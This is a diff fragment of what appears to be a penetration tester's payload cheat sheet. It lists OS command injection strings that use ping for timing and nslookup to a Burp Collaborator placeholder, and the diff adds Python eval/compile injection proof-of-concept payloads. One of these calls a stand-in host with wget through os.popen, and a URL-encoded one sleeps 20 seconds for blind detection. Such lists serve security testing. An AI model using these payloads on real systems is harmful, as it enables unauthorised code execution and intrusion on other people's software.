@@ -16,7 +16,10 @@ payload 1 [PING]
 |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1 
 payload 2 [Nslookup]
 |nslookup -q=cname http://YOUR.burpcollaborator.net.&
-  
+
+POC Code: eval(compile(“””for x in range(1):\n import os\n os.popen(r’wget http://vpsip.com:8000').read()""",'','single'))
+
+POC Code: eval%28compile%28%27for%20x%20in%20range%281%29%3A%0A%20import%20time%0A%20time.sleep%2820%29%27%2C%27a%27%2C%27single%27%29%29
 
   
 cookie atributes
